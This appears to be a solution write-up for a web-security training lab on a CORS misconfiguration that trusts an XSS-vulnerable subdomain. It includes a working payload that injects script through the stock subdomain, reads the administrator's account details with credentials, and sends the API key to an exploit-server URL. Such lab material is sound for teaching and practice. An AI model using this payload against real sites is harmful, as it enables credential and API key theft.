@@ -1,0 +1,48 @@
+// Lab: CORS vulnerability with trusted insecure protocols
+
+This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.
+
+To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+
+// Solution
+
+
+Step 1: Identify the CORS Policy
+
+// Log in as wiener:peter and check the /accountDetails endpoint:
+
+GET /accountDetails
+Origin: http://subdomain.LAB-ID.web-security-academy.net
+You'll see the response trusts it with Access-Control-Allow-Origin and Access-Control-Allow-Credentials: true.
+
+
+Step 2: Find the Vulnerable Subdomain
+
+Browse to the product pages and check the "Check stock" feature. It typically calls:
+
+http://stock.0a0c007503d24b838001035e00140073.web-security-academy.net/?productId=4&storeId=1
+
+This subdomain reflects a parameter without sanitization — it's XSS vulnerable.
+
+
+Step 3: Craft the Exploit Payload and Inject.
+
+// Exploit
+
+<script>
+    document.location="http://stock.0a0c007503d24b838001035e00140073.web-security-academy.net/?productId=4<script>const req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a0c007503d24b838001035e00140073.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a88004c03a14bf28082023d012f00a2.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1";
+</script>
+
+
+Step 4: Deliver & Extract the Key
+
+1. Save the payload on your exploit server
+2. Click "Deliver exploit to victim"
+3. Check your exploit server access logs
+4. Find the GET request to /log?key=... — the value will be the full JSON response containing the apikey
+5. Submit the API key to solve the lab.
